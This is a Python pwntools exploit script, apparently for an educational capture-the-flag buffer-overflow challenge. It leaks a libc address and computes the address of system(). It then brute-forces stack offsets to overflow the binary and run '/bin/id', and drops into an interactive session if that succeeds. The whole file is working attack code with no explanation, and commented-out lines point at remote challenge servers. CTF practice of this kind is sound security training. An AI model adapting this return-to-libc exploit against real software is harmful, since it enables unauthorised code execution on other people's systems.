from pwn import *
import time

#312
#64


for offset1 in range(0, 500,8):
    for offset2 in range(0,500,8):
        for offset3  in range(0,500,8):
            p = process("/mnt/c/Users/jann7/Desktop/eof/pbof/pbof/share/chal")
            # p = remote("edu-ctf.zoolab.org", 10013)
            # p = remote("127.0.0.1", 10013)
            gets = p.recvuntil("\n").decode("utf-8").strip("]\n").split(" ")[1]
            print(gets)
            gets = int(gets, 16)

            # gets = 0x7ffff7e4b970
            libc = gets - 0x0000000000083970
            system = libc + 0x0000000000052290


            rax = 0x7ffff76e18f0
            rax = libc - 0x6E6710
            rax = p64(rax)

            callee = system
            callee = p64(callee)



            # rdi = b"/bin/whoami\x00".ljust(8, b'\x00')
            rdi = b"/bin/id\x00".ljust(8, b'\x00')
            garbage = b'z'*offset1 + rdi + offset3 * b'c' + rax + offset2 * b'a' +callee 
            print(offset1, offset2, offset3)
            garbage = garbage.replace(b"jaaaaaaa", rax)
            garbage = garbage.replace(b"yaaaaaab", callee)
            garbage = garbage.replace(b"iaaaaaaa", rdi)
            paylaod = garbage
            paylaod =  paylaod
            

            p.sendlineafter("?", paylaod)
            print(p.recv())
            try:
                print(p.recv())
                p.interactive()
                break

            except:
                pass
            
p.interactive()
with open('./output', 'wb') as f:
    f.write(paylaod)